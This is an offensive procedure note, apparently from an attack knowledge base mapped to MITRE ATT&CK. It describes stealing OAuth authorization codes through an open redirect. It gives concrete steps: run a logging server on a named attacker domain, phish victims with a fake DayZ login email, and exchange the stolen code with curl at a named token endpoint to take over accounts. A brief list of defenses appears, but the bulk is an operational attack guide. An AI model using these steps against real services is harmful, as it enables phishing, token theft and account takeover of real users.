---
tags:
  - oauth
  - token-theft
  - credential-access
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Steal Application Access Token]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a42cbddc-b2ee-448f-b0b7-5bb8022af7f0
created_at: '2025-12-14T17:24:38.874Z'
updated_at: '2025-12-14T17:24:38.874Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Capture-Redirected-OAuth-Parameters-on-Malicious-Domain

## Summary

This procedure captures the OAuth authorization code and state parameters leaked via the open redirect to an attacker-controlled domain, enabling token exchange and account takeover.

## Description

Once the victim authorizes the malicious URL, the authorization server redirects to the tampered redirect_uri, appending sensitive parameters in the query string. The attacker logs these on their server and uses the code to obtain access tokens. This exploits the lack of full redirect validation, leading to token theft. Requires a running server on the malicious domain and knowledge of the client_secret for token exchange.

## Requirements

1. Attacker domain with a logging web server (e.g., Nginx or Python's http.server)
2. Stolen code and state from redirect logs
3. Client credentials (client_id, client_secret) from reconnaissance or assumption

## Defense

Defensive measures and detection strategies:

- Bind OAuth callbacks to specific, verified domains only
- Use PKCE (Proof Key for Code Exchange) to prevent code interception
- Monitor for anomalous token exchanges and rate-limit authorization requests

## Objectives

1. Log incoming redirects with OAuth parameters
2. Extract and validate the authorization code
3. Exchange code for access tokens to takeover accounts

## Instructions

### Step 1: Set Up Logging Server

**Context**: Prepare the malicious domain to capture query parameters.

On your server at xbox.dayz.comtest.com, start a simple HTTP server that logs requests to /api/auth/callback. For example, use Python:

```bash
python -m http.server 80
```

> Modify to log GET requests with query strings; expected: access logs showing ?code=AUTH_CODE&state=STATE.

### Step 2: Induce Victim Access

**Context**: Have the victim (or simulate) access the crafted URL from previous step.

Distribute the malicious URL via phishing (e.g., email claiming DayZ login issue). Upon authorization, redirect occurs.

> No direct command; monitor server logs in real-time.

### Step 3: Exchange Stolen Code for Tokens

**Context**: Use the captured code to request access tokens.

With the logged code, POST to the token endpoint:

```bash
curl -X POST https://accounts.bistudio.com/api/token \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "code=STOLEN_CODE" \
  -d "grant_type=authorization_code" \
  -d "redirect_uri=https://xbox.dayz.comtest.com/api/auth/callback"
```

> Expected output: JSON with access_token, allowing API calls for account takeover (e.g., change email/password).

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[oauth]]
- [[token-theft]]
- [[account-takeover]]
